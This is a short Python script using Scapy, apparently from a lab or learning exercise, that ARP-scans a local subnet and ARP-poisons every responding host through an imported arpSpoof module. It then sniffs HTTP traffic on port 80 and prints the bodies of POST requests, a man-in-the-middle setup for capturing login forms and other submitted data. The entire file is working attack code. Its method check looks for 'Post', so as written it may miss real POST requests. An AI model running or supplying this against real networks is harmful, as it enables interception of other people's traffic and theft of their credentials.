import arpSpoof
from scapy.all import *
from scapy.layers.http import HTTPRequest

victimIP =[]
spoofIP = []
attackerIP = "192.168.56.104"
networkInterface = "enp0s3"

#scan network
ans, unans = srp (Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = "192.168.56.0/24"), timeout = 2, iface = networkInterface, inter = 0.1)
for arg1, arg2 in ans :
    if arg2[ARP].psrc != attackerIP:
        victimIP.append(arg2)
        spoofIP.append(arg2)

arpSpoof.arpPoisoning(victimIP, spoofIP, networkInterface)

def processPacket (pkt):
    if pkt.haslayer(HTTPRequest):
        url = pkt[HTTPRequest].Host.decode() + pkt[HTTPRequest].Path.decode()
        ip = pkt[IP].src
        method = pkt[HTTPRequest].Method.decode()
        if pkt.haslayer(Raw) and method == "Post":
            print(pkt[Raw].load)
def sniff_packets(networkInterface):
    sniff(filter = "port 80", prn = processPacket, iface = networkInterface)

sniff_packets(networkInterface)